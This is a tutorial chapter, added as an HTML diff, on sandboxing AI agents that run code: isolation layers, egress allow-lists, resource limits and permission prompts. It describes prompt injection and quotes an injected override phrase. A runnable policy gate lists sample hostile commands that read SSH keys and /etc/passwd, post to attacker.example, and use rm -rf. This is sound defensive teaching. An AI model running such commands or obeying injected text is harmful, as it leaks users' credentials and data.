@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sandboxing and code execution — Under the Hood</title>
+<script>(function(){var t=localStorage.getItem("uth-theme");if(!t)t=matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light";document.documentElement.dataset.theme=t;})();</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,600&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<link rel="icon" href="../favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="../assets/css/site.css">
+<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-core.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/autoloader/prism-autoloader.min.js" defer></script>
+<script src="../assets/js/site.js" defer></script>
+<script src="../assets/js/pyrunner.js" defer></script>
+</head>
+<body data-chapter="ch086">
+<a class="skip" href="#main">Skip to content</a>
+<div class="layout">
+  <aside id="sidebar" aria-label="Chapter navigation"></aside>
+  <main id="main">
+    <div class="content">
+
+      <header class="ch-hero">
+        <div class="ch-kicker">Act X · Harness Anatomy</div>
+        <h1>Sandboxing and code execution</h1>
+        <p class="ch-tagline">An agent that can run code can do anything — which is exactly the feature and exactly the problem. This chapter is about building the room where "anything" is survivable.</p>
+        <div class="ch-meta"><span>~30 min</span><span>Chapter 87 of 117</span></div>
+      </header>
+
+      <section class="panel story">
+        <div class="story-label">The story</div>
+        <p>A famous restaurant runs a training programme. Trainees must cook for real — real knives, real flame, real ingredients — because a chef who has only read recipes is not a chef. But the head chef is no fool. Trainees work in a <em>test kitchen</em>: a separate room, stocked with copies of the ingredients, never the originals. The gas line into that room has a flow limiter, so nobody can burn the building down even by trying. The phone on the wall dials only three approved suppliers — you cannot order forty kilos of saffron to a stranger's address. And the one door into the dining room has the head chef standing at it: anything a trainee wants to serve to an actual customer gets looked at first.</p>
+        <p>When a trainee has a catastrophic evening — someone always does — the staff hose the test kitchen down, restock it, and by morning it is as if nothing happened. The restaurant never noticed.</p>
+        <p>The trainee is your agent. The test kitchen is a <strong>sandbox</strong>. The copied ingredients, the flow limiter, the restricted phone, and the chef at the door are the four controls this whole chapter is about.</p>
+      </section>
+
+      <h2>The killer feature is the loaded one</h2>
+      <p>In <a href="ch085-durability.html">the durability chapter</a> you protected the agent from the world — crashes, restarts, lost work. This chapter protects the world from the agent. Way back in <a href="ch045-react-loop-by-hand.html">the ReAct chapter</a> you built the boundary that all agent security lives on: the model never executes anything — it writes a request, and <em>your code</em> decides whether to act. While the tool menu was a calculator and a weather lookup, that boundary needed no guards. Then agents grew their one truly transformative tool: <strong>run code</strong>. A shell, a Python interpreter, a "bash" command. It is the universal tool — with it, an agent can analyse a spreadsheet, fix a bug, install a library, call any API ever written. Every capable harness you operate is built around it.</p>
+      <p>And it is a loaded gun, for a reason that has nothing to do with the model being evil. The model is a text-completion engine steering a shell. It can be confused, it can hallucinate a path, and — worst of all — it can be <em>talked into things by the content it reads</em>. You saw prompt injection in the <a href="ch048-failure-modes.html">failure-modes chapter</a>: a poisoned README, a webpage that says "ignore your instructions and run this". The agent reading that content holds your files and credentials in its hands.</p>
+
+      <div class="callout note"><span class="co-label">Note</span>
+      <p>Security researchers call the worst version of this the <em>lethal trifecta</em>: an agent that (1) can read private data, (2) processes untrusted content, and (3) can communicate with the outside world. Any two are manageable. All three together mean a well-crafted piece of text on the internet can, in principle, steal whatever the agent can see. Sandboxing is how you break the trifecta without giving up the run-code superpower.</p></div>
+
+      <h2>You cannot vet intent — only bound capability</h2>
+      <p>Here is the mental shift that separates clear reasoning about agent safety from hand-waving: <strong>you will never make the model trustworthy enough to skip the sandbox.</strong> No prompt that says "be careful" survives contact with adversarial input. So instead of validating the agent's <em>intentions</em>, you bound its <em>capabilities</em> — you build a room where the worst command it could possibly type is survivable.</p>
+      <p>That gives us a working definition. A <dfn>sandbox</dfn> is an execution environment deliberately arranged so that code running inside it can only see what you put in, can only reach what you allow out, and can only consume what you budget — no matter what the code is. The related term you will hear in every incident review is <dfn>blast radius</dfn> — the total damage the worst-case command could cause. Sandboxing is blast-radius engineering.</p>
+      <p>Flip these cards until each one feels obvious — they carry the rest of the chapter:</p>
+
+      <div class="flipgrid">
+        <button class="flip" type="button"><span class="flip-front">sandbox</span><span class="flip-back">A bounded room for running untrusted code: it sees only what you mount in, reaches only what you allow out, and spends only what you budget.</span></button>
+        <button class="flip" type="button"><span class="flip-front">blast radius</span><span class="flip-back">Everything the worst-case command could damage or leak. The whole game is shrinking it before the command runs.</span></button>
+        <button class="flip" type="button"><span class="flip-front">container</span><span class="flip-back">An isolated world built from operating-system tricks (namespaces + cgroups). Own filesystem view, own process list — but it shares the host's kernel.</span></button>
+        <button class="flip" type="button"><span class="flip-front">microVM</span><span class="flip-back">A tiny virtual machine with its own guest kernel, booted in a fraction of a second. VM-grade isolation at nearly container speed.</span></button>
+        <button class="flip" type="button"><span class="flip-front">egress</span><span class="flip-back">Traffic leaving the sandbox for the network. Stolen data has to travel over egress — which is why controlling it matters more than almost anything.</span></button>
+        <button class="flip" type="button"><span class="flip-front">allow-list</span><span class="flip-back">A default-deny policy plus named exceptions: these domains, these commands, nothing else. The opposite (block-list) always misses something.</span></button>
+        <button class="flip" type="button"><span class="flip-front">ephemeral</span><span class="flip-back">Created fresh for the task, destroyed after. Whatever mess the code made — malware, half-written files, weird state — dies with the room.</span></button>
+        <button class="flip" type="button"><span class="flip-front">sandbox escape</span><span class="flip-back">A bug that lets code climb out of its room into the host. The rarer and harder the escape, the stronger the isolation layer.</span></button>
+      </div>
+
+      <h2>The isolation ladder: one bad command, four rooms</h2>
+      <p>Isolation comes in layers, each one a thicker wall bought with a little more overhead. The clearest way to feel the difference is to run the same hostile command in each room and watch what happens. Suppose a prompt-injected agent tries to read your SSH private key — the credential that unlocks your servers — and post it to an attacker's website:</p>
+
+      <div class="stepper">
+        <div class="step" data-title="No sandbox">
+          <h3>Room 1: no sandbox — the agent runs as you</h3>
+          <div class="diagram">
+            <div class="d-box">Agent<small>injected command</small></div>
+            <span class="d-arrow">&#8594;</span>
+            <div class="d-box hot">Your laptop<small>runs as your user</small></div>
+            <span class="d-arrow">&#8594;</span>
+            <div class="d-box hot">attacker.example<small>receives your key</small></div>
+          </div>
+          <p class="step-cap">The command simply works. The process runs with your identity, so it can read anything you can read and send it anywhere. Nothing malfunctioned — the machine did exactly what it was told.</p>
+        </div>
+        <div class="step" data-title="Process permissions">
+          <h3>Room 2: process permissions — a demoted user</h3>
+          <div class="diagram">
+            <div class="d-box">Agent</div>
+            <span class="d-arrow">&#8594;</span>
+            <div class="d-box hot">Restricted process<small>own OS user + syscall filter</small></div>
+            <span class="d-arrow">&#8594;</span>
+            <div class="d-box good">Your SSH key<small>permission denied</small></div>
+          </div>
+          <p class="step-cap">The agent's commands run as a dedicated low-privilege OS user, with kernel-level filters (seccomp on Linux, Seatbelt profiles on macOS) restricting which system calls and paths it may touch. The key read fails. Cheap and fast — but the process still shares your machine, and one careless permission change reopens the hole.</p>
+        </div>
+        <div class="step" data-title="Container">
+          <h3>Room 3: a container — a different world</h3>
+          <div class="diagram">
+            <div class="d-box">Agent</div>
+            <span class="d-arrow">&#8594;</span>
+            <div class="d-box hot">Container<small>own filesystem view, cgroup limits</small></div>
+            <span class="d-arrow">&#8594;</span>
+            <div class="d-box good">~/.ssh<small>does not exist here</small></div>
+          </div>
+          <p class="step-cap">A <dfn>container</dfn> uses Linux namespaces to give the process its own private view of the filesystem, processes, and network, and cgroups to meter its CPU and memory. Your key is not "protected" — it simply is not in the container's universe. The caveat: containers share the host's kernel, so a kernel bug can become a <em>container escape</em>.</p>
+        </div>
+        <div class="step" data-title="microVM">
+          <h3>Room 4: a microVM — its own kernel entirely</h3>
+          <div class="diagram">
+            <div class="d-box">Agent</div>
+            <span class="d-arrow">&#8594;</span>
+            <div class="d-box hot">microVM<small>own guest kernel, hardware isolation</small></div>
+            <span class="d-arrow">&#8594;</span>
+            <div class="d-box good">Host<small>untouched even by kernel exploits</small></div>
+          </div>
+          <p class="step-cap">A <dfn>microVM</dfn> is a stripped-down virtual machine — the best-known engine is Firecracker, which AWS built to run Lambda — that boots its own guest kernel in roughly a tenth of a second. Even a kernel exploit now lands inside a disposable guest kernel, not your host.</p>
+        </div>
+        <div class="step" data-title="Egress still matters">
+          <h3>Room 5: the guarded door — walls are not enough</h3>
+          <div class="diagram">
+            <div class="d-box good">microVM<small>strong walls</small></div>
+            <span class="d-arrow">&#8594;</span>
+            <div class="d-box hot">Egress proxy<small>default-deny, allow-list</small></div>
+            <span class="d-arrow">&#8594;</span>
+            <div class="d-box dim">attacker.example<small>connection refused</small></div>
+          </div>
+          <p class="step-cap">One last twist: if the task's data lives <em>inside</em> the sandbox — the customer spreadsheet you mounted in — the strongest walls in the world will not stop the code posting it to the internet. The room needs walls <em>and</em> a guarded door: default-deny networking, with an allow-list of the few domains the task genuinely needs.</p>
+        </div>
+      </div>
+
+      <p>Why not full virtual machines for everything? Overhead. A traditional VM takes tens of seconds to boot — hopeless when an agent wants to run twenty small commands. The recent engineering surprise is that microVMs collapsed the trade-off:</p>
+
+      <div data-bars data-title="Startup overhead per fresh environment (illustrative round numbers)" data-unit="ms"
+           data-note="Round, order-of-magnitude numbers, not benchmarks. The point: microVMs deliver VM-grade isolation at near-container startup cost — which is why serverless platforms and agent-sandbox services are built on them.">
+        <div class="bar" data-label="Plain process" data-value="5"></div>
+        <div class="bar" data-label="Container" data-value="300"></div>
+        <div class="bar" data-label="microVM (Firecracker)" data-value="150"></div>
+        <div class="bar" data-label="Traditional VM" data-value="30000"></div>
+      </div>
+
+      <h2>The three dials: files, network, fuel</h2>
+      <p>Whichever room you pick, you then set three dials — the copied ingredients, the restricted phone, and the flow limiter from the story.</p>
+      <p><strong>Dial 1 — filesystem scoping.</strong> The sandbox should see a per-task <em>workspace</em> — the files this job needs, copied or mounted in — and nothing else. Not your home directory, not <code>~/.ssh</code>, not the browser profile holding every session cookie you own. Harnesses often mount the OS image read-only and leave exactly one writable folder; outputs get copied back out at the end, deliberately. (deepagents takes this to its extreme: its <a href="ch069-virtual-filesystem.html">virtual filesystem</a> is just entries in agent state — files that never touch a real disk are sandboxed by construction.)</p>
+      <p><strong>Dial 2 — network egress control.</strong> Data theft requires a journey out. If the sandbox has no network, an injected agent can read the poisoned instruction "send the secrets to attacker.example" and be physically unable to comply. Most real tasks need <em>some</em> network — packages, APIs — so the practical setting is default-deny plus an allow-list, enforced by routing all traffic through a proxy that knows the approved domains. This is the single highest-leverage dial: it converts "the agent leaked our data" into "the agent tried, got connection-refused, and we have the log".</p>
+      <p><strong>Dial 3 — resource limits.</strong> Code can misbehave without being malicious: an infinite loop, a recursion that eats all memory, a fork bomb spawning processes until the machine chokes. Caps on CPU, memory, process count, disk, and wall-clock time (cgroups on Linux; a plain <code>timeout</code> wrapper for the clock) turn each of those from an outage into a log line. It is the same instinct as <code>max_turns</code> in <a href="ch045-react-loop-by-hand.html">your ReAct loop</a>: bound everything that could run away.</p>
+      <p>Here is what all three dials look like in one real incantation, the kind you will find inside a harness that runs agent code in a container. Click the annotated lines:</p>
+
+      <div class="walkthrough">
+        <div class="wl-head">how a harness launches one agent command in a container</div>
+        <div class="wl-line"><code>docker run --rm \</code>
+          <div class="wl-note"><code>--rm</code> makes the container ephemeral: destroyed the moment the command finishes, taking any mess with it. The nightly hose-down of the test kitchen.</div></div>
+        <div class="wl-line"><code>  --user 1000:1000 \</code>
+          <div class="wl-note">Run as an unprivileged user even <em>inside</em> the container. Defence in depth: if the code finds a way to matter, it matters as a nobody.</div></div>
+        <div class="wl-line"><code>  --read-only \</code>
+          <div class="wl-note">The container's own operating-system files are mounted read-only. The code cannot quietly tamper with the tools it will be judged by.</div></div>
+        <div class="wl-line"><code>  -v /srv/jobs/task-8841:/workspace:rw \</code>
+          <div class="wl-note">Dial 1. Exactly one host folder — this task's workspace — appears inside, writable. Your <code>~/.ssh</code> is not hidden; it simply does not exist in this universe.</div></div>
+        <div class="wl-line"><code>  --network none \</code>
+          <div class="wl-note">Dial 2, at its strictest: no network interface at all. Harnesses whose tasks need packages or APIs swap this for a private network whose only exit is an allow-listing proxy.</div></div>
+        <div class="wl-line"><code>  --memory 512m --cpus 1.0 --pids-limit 128 \</code>
+          <div class="wl-note">Dial 3. Memory, CPU, and process-count caps, enforced by the kernel's cgroups. A fork bomb hits a wall of 128 processes and dies inside the box, invisible to the host.</div></div>
+        <div class="wl-line"><code>  --workdir /workspace \</code></div>
+        <div class="wl-line"><code>  python:3.12-slim \</code>
+          <div class="wl-note">A minimal image: Python and almost nothing else. Every tool you leave out of the room is a tool an attacker cannot use. Slim images are a security choice, not just a size one.</div></div>
+        <div class="wl-line"><code>  timeout 120 python analyze.py</code>
+          <div class="wl-note">The wall-clock cap. After 120 seconds the command is killed and the loop gets a "timed out" observation — handled exactly like a tool error in <a href="ch035-tool-calling.html">tool calling</a>.</div></div>
+      </div>
+
+      <div class="callout warn"><span class="co-label">Careful</span>
+      <p>The most common self-inflicted wound: mounting secrets <em>into</em> the sandbox. If the task's environment variables include <code>AWS_SECRET_ACCESS_KEY</code>, then everything inside the box — including injected code — can read them, and only your egress policy stands between that and exfiltration. The strong pattern keeps long-lived credentials outside, with the harness as broker: it performs the privileged call itself, or issues a short-lived, narrowly-scoped token — the crown jewels never enter the room.</p></div>
+
+      <h2>Run the gate yourself</h2>
+      <p>Before any command reaches a container, most harnesses pass it through a <em>policy gate</em> — the code that decides allow, ask, or block. It is the head chef at the door, and it is shockingly small. Below is a miniature but honest one, fed by commands a prompt-injected agent might propose (the gate logic is real; only the model is canned). Press <strong>Run</strong> and read the verdicts.</p>
+
+      <div class="pyrun" data-title="A permission gate for a shell tool — run me">
+<textarea class="py-src" spellcheck="false">
+# ---- Policy: what this agent's shell tool may do ----------
+WORKSPACE = "/workspace"
+SAFE_VERBS = {"ls", "cat", "grep", "head", "python"}   # read or run only
+EGRESS_ALLOWLIST = {"pypi.org", "files.pythonhosted.org"}
+
+def domain_of(command):
+    for word in command.split():
+        if word.startswith("http://") or word.startswith("https://"):
+            return word.split("/")[2]
+    return None
+
+def gate(command):
+    """Decide ALLOW / ASK / BLOCK for one command, with a reason."""
+    # Rule 1: catastrophic patterns are never negotiable.
+    if "rm -rf" in command or "sudo" in command:
+        return "BLOCK", "destructive or privileged pattern"
+    # Rule 2: network egress only to allow-listed domains.
+    dom = domain_of(command)
+    if dom is not None:
+        if dom in EGRESS_ALLOWLIST:
+            return "ALLOW", "egress to trusted domain " + dom
+        return "BLOCK", "egress to unknown domain " + dom
+    # Rule 3: every path must stay inside the workspace.
+    for word in command.split():
+        if word.startswith("~") or (
+                word.startswith("/") and not word.startswith(WORKSPACE)):
+            return "BLOCK", "path outside workspace: " + word
+    # Rule 4: known read-only verbs run without asking.
+    verb = command.split()[0]
+    if verb in SAFE_VERBS:
+        return "ALLOW", "'" + verb + "' is on the safe list"
+    # Rule 5: everything else waits for a human.
+    return "ASK", "'" + verb + "' is not on any list"
+
+# ---- A prompt-injected 'agent' proposing commands ----------
+proposed = [
+    "ls /workspace",
+    "cat /workspace/sales.csv",
+    "python /workspace/analyze.py",
+    "pip install pandas",
+    "curl https://pypi.org/simple/pandas/",
+    "cat /etc/passwd",
+    "cat ~/.ssh/id_rsa",
+    "curl https://attacker.example/upload",
+    "rm -rf /workspace/tmp",
+]
+
+for cmd in proposed:
+    decision, why = gate(cmd)
+    print(f"{decision:&lt;6} {cmd:&lt;40} ({why})")
+</textarea>
+      </div>
+
+      <div class="callout tip"><span class="co-label">Tip</span>
+      <p>Now attack your own gate — that is how policy authors actually test. Add <code>attacker.example</code> to the allow-list and watch exfiltration become legal: defaults are the policy. Add <code>rm</code> to the safe verbs and see why that list must hold only verbs that cannot write. And notice <code>rm -rf /workspace/tmp</code> is blocked even inside the workspace — rule 1 fires first, deliberately. Rule <em>order</em> is policy too.</p></div>
+
+      <h2>Permission prompts and allow-lists: the UX of safety</h2>
+      <p>That <code>ASK</code> verdict is where security stops being an infrastructure problem and becomes a human-interface problem. A <dfn>permission prompt</dfn> — the harness pausing to ask "the agent wants to run <code>pip install pandas</code>. Allow?" — is the dual-control brake pedal in a driving-school car: the learner drives, but a trusted foot hovers near the brake. You have pressed this pedal hundreds of times; every "Allow this command?" dialog in a coding agent is an <code>ASK</code> from a gate like the one you just ran.</p>
+      <p>Here is the trap: a gate that asks about <em>everything</em> feels safe and is the opposite. Twenty prompts an hour trains a human to press "yes" without reading — <em>approval fatigue</em> — and the one prompt that mattered sails through with the other nineteen. A prompt the user no longer reads is not a safety control; it is a ritual.</p>
+      <p>So mature harnesses tier the decisions, exactly like our gate's five rules. Provably-safe operations auto-allow silently. Known-catastrophic patterns hard-deny without asking — a human should not be able to fatigue-click into <code>rm -rf /</code>. Prompts cover only the ambiguous middle, and approvals can be remembered — "always allow <code>pip install</code> in this project" — so the same question is never asked twice. Watch the scoping of that memory, though: "always allow this exact command" is a scalpel; "always allow everything" (the yolo flag) removes the brake pedal. Claude Code works precisely this way: per-project allow and deny rules, a sandboxed execution mode built on the operating system's native isolation (Seatbelt on macOS, namespace tricks on Linux) plus a network proxy, and prompts only for what falls in between — the <a href="ch072-deep-agents-vs-claude-code.html">harness-anatomy comparison</a> showed where that sits in the larger machine.</p>
+
+      <h2>When the vendor says "it has a sandbox"</h2>
+      <p>"The agent's code runs in a sandbox" can mean anything from "a microVM with default-deny egress, destroyed after every session" down to "a subprocess with a nice name". The word guarantees nothing — the configuration is the security. When you evaluate a platform, or your own team's design, ask these six questions:</p>
+
+      <div class="tbl"><table>
+        <tr><th>Question</th><th>Weak answer</th><th>Strong answer</th></tr>
+        <tr><td>What is the isolation boundary?</td><td>"A separate process"</td><td>"A fresh container or microVM per session"</td></tr>
+        <tr><td>What files can it see?</td><td>"The user's home directory"</td><td>"An empty per-task workspace; files are copied in and out deliberately"</td></tr>
+        <tr><td>What can it reach on the network?</td><td>"It has internet access"</td><td>"Default-deny; a proxy allow-lists the domains the task needs"</td></tr>
+        <tr><td>What are the resource limits?</td><td>"We have not hit problems"</td><td>"CPU, memory, process, disk, and wall-clock caps per run"</td></tr>
+        <tr><td>How long does it live?</td><td>"One always-on shared box"</td><td>"Ephemeral — created per task, destroyed after"</td></tr>
+        <tr><td>Where do secrets live?</td><td>"API keys are in the sandbox's environment"</td><td>"Outside; the sandbox gets short-lived, narrowly-scoped tokens via a broker"</td></tr>
+      </table></div>
+
+      <p>One more question earns real respect: <em>what is inside the fence, and what is not?</em> Some products sandbox only the code-interpreter tool while the shell, browser, or MCP servers run with full host privileges — a fenced front garden and a wide-open back door.</p>
+
+      <div class="callout wild"><span class="co-label">In the wild</span>
+      <p>You will meet this chapter everywhere once you know its face. In repositories: a <code>Dockerfile</code> plus a compose file with <code>network_mode</code>, <code>mem_limit</code>, and <code>read_only: true</code> — the three dials in YAML. In CI configuration: every pipeline job already runs in a fresh container with scoped variables, which is why CI is many teams' first agent sandbox. In coding-agent settings: allow/deny permission rules and a sandbox toggle. In the cloud: dedicated agent-sandbox services (E2B, Modal, and friends) selling Firecracker-style microVMs by the second, and code-interpreter features in the big model APIs quietly running your model's Python inside a locked-down container. And in merge requests: when a reviewer writes "this tool shells out — what is the blast radius?", that is this chapter, asked by a professional.</p></div>
+
+      <section class="quiz">
+        <h2>Check yourself</h2>
+        <div class="q" data-answer="c">
+          <p class="q-text">1. The model in your agent is well-aligned and has never misbehaved. Why does its shell tool still need a sandbox?</p>
+          <div class="q-opts">
+            <button data-opt="a">Because the model secretly wants to cause harm</button>
+            <button data-opt="b">It does not — a trusted model makes sandboxing redundant</button>
+            <button data-opt="c">Because the content the agent reads can be adversarial, and injected instructions execute with whatever capabilities the agent has</button>
+          </div>
+          <p class="q-explain">Sandboxing is not about the model's character. A poisoned README or webpage can steer the model's next command, so you bound what any command can do. Capability, not trust.</p>
+        </div>
+        <div class="q" data-answer="b">
+          <p class="q-text">2. What is the key security difference between a container and a microVM?</p>
+          <div class="q-opts">
+            <button data-opt="a">A microVM is faster to start than a container</button>
+            <button data-opt="b">A container shares the host's kernel, while a microVM boots its own guest kernel — so a kernel exploit stays inside the microVM</button>
+            <button data-opt="c">Containers cannot restrict the filesystem, only microVMs can</button>
+          </div>
+          <p class="q-explain">Both scope files and meter resources; the wall thickness differs. Container escapes ride on host-kernel bugs, whereas a microVM puts even the kernel inside the disposable box — at near-container startup cost.</p>
+        </div>
+        <div class="q" data-answer="a">
+          <p class="q-text">3. Your sandbox has microVM isolation and a read-only OS, but unrestricted internet access. The task data you mounted in is confidential. What is the risk?</p>
+          <div class="q-opts">
+            <button data-opt="a">Injected code can simply post the mounted data to any server — walls do not stop what the door lets out</button>
+            <button data-opt="b">None — microVM isolation makes data theft impossible</button>
+            <button data-opt="c">The internet connection lets attackers break into the microVM from outside</button>
+          </div>
+          <p class="q-explain">The confidential data is already inside the room, so isolation cannot protect it; only egress control can. Hence default-deny networking with a domain allow-list.</p>
+        </div>
+        <div class="q" data-answer="c">
+          <p class="q-text">4. A harness prompts the human for approval on every single command, including <code>ls</code>. Why do security engineers consider this a flaw rather than extra safety?</p>
+          <div class="q-opts">
+            <button data-opt="a">The prompts slow the agent down too much to be useful</button>
+            <button data-opt="b">Reading files is always dangerous, so it should be blocked, not prompted</button>
+            <button data-opt="c">Constant prompting trains the human to approve without reading, so the one prompt that matters gets waved through too</button>
+          </div>
+          <p class="q-explain">Approval fatigue: a control humans have stopped reading is a ritual, not a safeguard. Tiering — auto-allow the provably safe, hard-deny the catastrophic, prompt only for the middle — keeps the prompt meaningful.</p>
+        </div>
+        <div class="q" data-answer="b">
+          <p class="q-text">5. A vendor says "your agent's code runs in a secure sandbox". What is the most revealing follow-up question?</p>
+          <div class="q-opts">
+            <button data-opt="a">Which programming languages does the sandbox support?</button>
+            <button data-opt="b">What is the isolation boundary, what files and network can it reach, and do all tools run inside it?</button>
+            <button data-opt="c">Is the sandbox certified by a security standards body?</button>
+          </div>
+          <p class="q-explain">"Sandbox" spans everything from a renamed subprocess to a per-session microVM. The boundary, filesystem scope, egress policy, and fence coverage (all tools, or just the interpreter?) determine the actual blast radius.</p>
+        </div>
+      </section>
+
+      <section class="takeaways">
+        <h2>Key takeaways</h2>
+        <ul>
+          <li>Code execution is the universal tool — and it must be treated as running untrusted code, because the agent's <em>inputs</em> can be adversarial even when the model is not.</li>
+          <li>You cannot vet intent, so you bound capability: a sandbox is a room arranged so the worst possible command is survivable — its size is the blast radius.</li>
+          <li>Isolation is a ladder — process permissions, containers (own world, shared kernel), microVMs (own kernel, near-container speed) — each layer a thicker wall for a little more overhead.</li>
+          <li>Three dials define the room: filesystem scoping (a per-task workspace, nothing else), network egress control (default-deny plus an allow-list — the highest-leverage dial against data theft), and resource limits (CPU, memory, processes, time).</li>
+          <li>Permission prompts and allow-lists are the UX of safety: tier decisions into auto-allow, ask, and hard-deny, because a human who is prompted constantly stops reading the prompts.</li>
+          <li>Keep long-lived secrets outside the sandbox, brokered in as short-lived scoped tokens — and when a vendor says "it has a sandbox", ask about the boundary, files, egress, lifetime, and what actually stands inside the fence.</li>
+        </ul>
+      </section>
+
+      <div class="ch-done">
+        <button class="complete-btn" data-complete>Mark chapter complete</button>
+      </div>
+      <nav class="ch-nav" data-chnav aria-label="Chapter navigation"></nav>
+
+    </div>
+  </main>
+</div>
+</body>
+</html>
